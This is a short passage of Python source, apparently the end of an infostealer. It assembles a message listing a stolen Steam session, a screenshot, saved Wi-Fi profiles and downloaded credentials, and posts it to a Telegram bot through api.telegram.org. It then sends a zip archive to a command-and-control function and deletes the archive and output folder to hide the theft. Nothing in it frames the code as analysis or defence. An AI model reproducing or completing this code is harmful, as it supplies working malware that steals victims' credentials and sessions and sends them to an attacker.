Steam Session: {'Yes' if steam_session == 1 else 'No'}
Screenshot: {"Yes" if ss_success == 1 else "No"}
Wi-Fi Networks: {str(wifiprofiles)}
Credentials: {download}
        '''
        payload = {
            'chat_id': chat_id,
            'text': msg
        }
        r = requests.post(f'https://api.telegram.org/bot{token}/sendMessage', data=payload)
sendtoc2(zip_)

removefile(zip_)
removedir(output)
